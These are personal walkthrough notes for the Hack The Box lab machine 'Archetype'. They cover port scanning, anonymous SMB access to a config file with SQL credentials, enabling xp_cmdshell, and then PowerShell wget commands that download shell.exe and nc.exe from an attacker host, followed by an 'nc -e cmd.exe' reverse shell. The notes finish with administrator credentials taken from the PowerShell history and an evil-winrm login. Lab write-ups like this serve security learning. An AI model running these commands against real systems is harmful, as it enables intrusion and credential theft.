# Archetype

IPv4: 10.129.95.187

## Enumeration/Scanning

- sudo nmap -sV -sC -Pn 10.129.95.187 -p-
    
    PORT      STATE SERVICE      VERSION
    135/tcp   open  msrpc        Microsoft Windows RPC
    139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
    1433/tcp  open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
    | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
    | Not valid before: 2023-08-08T00:12:20
    |_Not valid after:  2053-08-08T00:12:20
    |_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
    |_ms-sql-info: ERROR: Script execution failed (use -d to debug)
    |_ssl-date: 2023-08-08T00:16:34+00:00; 0s from scanner time.
    5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-server-header: Microsoft-HTTPAPI/2.0
    |_http-title: Not Found
    47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
    |_http-title: Not Found
    |_http-server-header: Microsoft-HTTPAPI/2.0
    49664/tcp open  msrpc        Microsoft Windows RPC
    49665/tcp open  msrpc        Microsoft Windows RPC
    49666/tcp open  msrpc        Microsoft Windows RPC
    49667/tcp open  msrpc        Microsoft Windows RPC
    49668/tcp open  msrpc        Microsoft Windows RPC
    49669/tcp open  msrpc        Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
    
    Host script results:
    | smb-os-discovery:
    |   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
    |   Computer name: Archetype
    |   NetBIOS computer name: ARCHETYPE\x00
    |   Workgroup: WORKGROUP\x00
    |_  System time: 2023-08-07T17:16:29-07:00
    | smb2-time:
    |   date: 2023-08-08T00:16:28
    |_  start_date: N/A
    |*clock-skew: mean: 1h45m01s, deviation: 3h30m02s, median: 0s
    | smb2-security-mode:
    |   311:
    |*    Message signing enabled but not required
    | smb-security-mode:
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 106.20 seconds
    

smbclient -N -L [//10.129.95.187](notion://10.129.95.187/) lists a backup share

smbclient -N [//10.129.95.187/backups](notion://10.129.95.187/backups)

get prod.dtsConfig

- prod.dtsConfig
    
    <DTSConfiguration>
    <DTSConfigurationHeading>
    <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
    <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
    </DTSConfiguration>
    

password=M3g4c0rp123

ARCHETYPE\sql_svc

login to sql server

sqsh -S 10.129.95.187 -U ARCHETYPE\\sql_svc -P 'M3g4c0rp123’

SELECT name, database_id, create_date

FROM sys.databases;

SELECT*FROMINFORMATION_SCHEMA.TABLES;

from https://academy.hackthebox.com/module/116/section/1169

If `xp_cmdshell` is not enabled, we can enable it, if we have the appropriate privileges, using the following command:

```
-- To allow advanced options to be changed.
EXECUTE sp_configure 'show advanced options', 1
GO

-- To update the currently configured value for advanced options.
RECONFIGURE
GO

-- To enable the feature.
EXECUTE sp_configure 'xp_cmdshell', 1
GO

-- To update the currently configured value for this feature.
RECONFIGURE
GO
```

xp_cmdshell 'whoami’ xp_cmdshell 'whoami’

great!

xp_cmdshell 'type C:\Users\sql_svc\Desktop\user.txt’

YEAH YEAH I gata get a shell….

xp_cmdshell 'copy \\10.10.16.173\Share\shell.exe C:\Users\sql_svc\Desktop\shell.exe’

“You can't access this shared folder because your organization's security policies block unauthenticated guest access”

python3 -m http.server 80

xp_cmdshell 'powershell.exe wget http://10.10.16.173/shell.exe -OutFile C:\Users\sql_svc\Desktop\shell.exe'

xp_cmdshell 'C:\Users\sql_svc\Desktop\shell.exe’

“Command shell session 1 is not valid and will be closed”

HUH

OK

well ima try nc then

/usr/share/windows-binaries

xp_cmdshell "powershell.exe wget http://10.10.16.173/nc.exe -OutFile C:\Users\Public\nc.exe"

xp_cmdshell "c:\Users\Public\nc.exe -e cmd.exe 10.10.16.173 4444”

Shell gained

powershell.exe wget http://10.10.16.173/shell.exe -OutFile shell.exe

OK I got a shell now with msfconsole IM DUMB and it was not valid earlier because I forgot to set the payload to windows/meterpreter_reverse_tcp 🙂

## Exploitation

## Privilege Escalation

running suggester on the session

nothing

checking powershell history

type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

\\Archetype\backups /user:administrator MEGACORP_4dm1n!!

ruby evil-winrm.rb -i 10.129.95.187 -u administrator -p 'MEGACORP_4dm1n!!’

rooted

## Post-exploitation

None
